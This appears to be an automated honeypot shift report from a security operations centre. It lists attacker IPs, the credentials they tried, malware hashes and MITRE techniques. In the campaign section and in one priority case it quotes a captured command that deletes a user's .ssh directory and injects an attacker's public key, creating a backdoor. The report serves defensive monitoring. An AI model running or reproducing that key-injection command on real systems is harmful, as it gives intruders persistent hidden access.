# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-26 |
| **Generated At** | 2026-03-26T15:02:31Z |
| **Shift Time** | 15:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **58** |
| Confirmed Threats | **48** |
| False Positives Filtered | **10** (17.2%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **17** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **54** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **31** |
| Unique Credential Pairs | **24** |
| Unique Usernames | **20** |
| Unique Passwords | **22** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4 |
| `jino` | 3 |
| `viper` | 3 |
| `dp` | 2 |
| `ftpuser` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `12345678` | 4 |
| `123456` | 3 |
| `123321` | 2 |
| `dp1234` | 2 |
| `ftpuser2026` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `jino` | `12345678` | 3 |
| `viper` | `123456` | 3 |
| `dp` | `dp1234` | 2 |
| `ftpuser` | `ftpuser2026` | 2 |
| `viewtinet` | `viewtinet` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `zyad1234` | `1.30.20.238` | 2026-03-26T13:12:13 |
| `root` | `Abcd!1234` | `34.71.30.159` | 2026-03-26T14:21:05 |
| `root` | `3245gs5662d34` | `34.71.30.159` | 2026-03-26T14:21:11 |
| `root` | `root2009` | `111.70.32.6` | 2026-03-26T14:40:40 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `34.71.30.159`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **26** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 4 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS17421` | Mobile Business Group | 1 | HIGH |
| `AS4771` | Spark New Zealand Trading Ltd. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-06fcbbb092c6

| Field | Detail |
|---|---|
| **Source IP** | `1.30.20[.]238` |
| **First Seen** | 2026-03-26 13:12 |
| **Last Seen** | 2026-03-26 13:12 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 13:12:08` | `cowrie.session.connect` |
| `2026-03-26 13:12:09` | `cowrie.client.version` |
| `2026-03-26 13:12:09` | `cowrie.client.kex` |
| `2026-03-26 13:12:13` | `cowrie.login.success` |
| `2026-03-26 13:12:14` | `cowrie.direct-tcpip.request` |
| `2026-03-26 13:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.30.20[.]238` to AbuseIPDB if not already reported
- [ ] Block `1.30.20[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55f344f922e5

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-03-26 14:21 |
| **Last Seen** | 2026-03-26 14:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 14:21:03` | `cowrie.session.connect` |
| `2026-03-26 14:21:03` | `cowrie.client.version` |
| `2026-03-26 14:21:04` | `cowrie.client.kex` |
| `2026-03-26 14:21:05` | `cowrie.login.success` |
| `2026-03-26 14:21:05` | `cowrie.session.params` |
| `2026-03-26 14:21:05` | `cowrie.command.input` |
| `2026-03-26 14:21:05` | `cowrie.command.failed` |
| `2026-03-26 14:21:06` | `cowrie.log.closed` |
| `2026-03-26 14:21:06` | `cowrie.session.params` |
| `2026-03-26 14:21:06` | `cowrie.command.input` |
| `2026-03-26 14:21:07` | `cowrie.session.file_download` |
| `2026-03-26 14:21:07` | `cowrie.log.closed` |
| `2026-03-26 14:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12d960ed657c

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-03-26 14:21 |
| **Last Seen** | 2026-03-26 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 14:21:09` | `cowrie.session.connect` |
| `2026-03-26 14:21:09` | `cowrie.client.version` |
| `2026-03-26 14:21:10` | `cowrie.client.kex` |
| `2026-03-26 14:21:11` | `cowrie.login.success` |
| `2026-03-26 14:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f6ec4558a7

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]6` |
| **First Seen** | 2026-03-26 14:40 |
| **Last Seen** | 2026-03-26 14:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 14:40:37` | `cowrie.session.connect` |
| `2026-03-26 14:40:38` | `cowrie.client.version` |
| `2026-03-26 14:40:38` | `cowrie.client.kex` |
| `2026-03-26 14:40:40` | `cowrie.login.success` |
| `2026-03-26 14:40:40` | `cowrie.direct-tcpip.request` |
| `2026-03-26 14:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.177[.]193` | **5** | 2026-03-26 14:13 | 2026-03-26 14:18 | 6m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `186.4.240[.]226` | **5** | 2026-03-26 14:12 | 2026-03-26 14:25 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `196.188.93[.]169` | **5** | 2026-03-26 14:16 | 2026-03-26 14:27 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.236[.]214` | **4** | 2026-03-26 14:40 | 2026-03-26 14:56 | 8m | 0 | `T1592` | 🟢 LOW |
| `103.187.146[.]107` | **2** | 2026-03-26 14:17 | 2026-03-26 14:20 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.15.163[.]139` | **2** | 2026-03-26 13:50 | 2026-03-26 13:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.180.137[.]77` | **2** | 2026-03-26 14:42 | 2026-03-26 14:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.171.125[.]94` | 1 | 2026-03-26 13:35 | 2026-03-26 13:35 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.28.234[.]150` | 1 | 2026-03-26 14:13 | 2026-03-26 14:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.78.177[.]144` | 1 | 2026-03-26 14:28 | 2026-03-26 14:28 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.187.228[.]228` | 1 | 2026-03-26 13:14 | 2026-03-26 13:14 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.195.205[.]236` | 1 | 2026-03-26 13:59 | 2026-03-26 13:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.194[.]123` | 1 | 2026-03-26 14:35 | 2026-03-26 14:35 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.105[.]108` | 1 | 2026-03-26 14:11 | 2026-03-26 14:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]16` | 1 | 2026-03-26 14:39 | 2026-03-26 14:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.95.107[.]110` | 1 | 2026-03-26 14:47 | 2026-03-26 14:47 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.95.42[.]130` | 1 | 2026-03-26 13:31 | 2026-03-26 13:31 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.106.59[.]245` | 1 | 2026-03-26 14:14 | 2026-03-26 14:14 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.47[.]32` | 1 | 2026-03-26 13:17 | 2026-03-26 13:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.239.54[.]162` | 1 | 2026-03-26 14:41 | 2026-03-26 14:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `212.47.103[.]61` | 1 | 2026-03-26 14:17 | 2026-03-26 14:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.132.26[.]232` | 1 | 2026-03-26 13:36 | 2026-03-26 13:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.71.30[.]159` | 1 | 2026-03-26 14:21 | 2026-03-26 14:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `73.98.14[.]213` | 1 | 2026-03-26 13:55 | 2026-03-26 13:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `81.56.112[.]44` | 1 | 2026-03-26 13:50 | 2026-03-26 13:50 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `84.238.92[.]245` | 1 | 2026-03-26 13:53 | 2026-03-26 13:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `196.188.93[.]169` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `180.76.236[.]214` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 16 |
| `103.187.146[.]107` | SG | Cloud Host Pte Ltd | **100** ⚠️ | 50 |
| `84.238.92[.]245` | DK | BOLIGNET-AARHUS F.M.B.A. | **100** ⚠️ | 0 |
| `1.30.20[.]238` | CN | China unicom InnerMongolia province network | **100** ⚠️ | 0 |
| `183.106.59[.]245` | KR | Korea Telecom | **100** ⚠️ | 0 |
| `175.195.205[.]236` | KR | Korea Telecom | **100** ⚠️ | 0 |
| `52.180.137[.]77` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `183.171.47[.]32` | MY | Celcom Axiata Berhad | **100** ⚠️ | 0 |
| `182.95.42[.]130` | IN | Bharti Airtel Limited | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 44 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 27 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 58 cases |
| Tool 34  | Credential Extractor        | ✅ 31 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (17.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 26 recon entry/entries in table (7 group(s) consolidating 25 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-26T15:02:31Z_
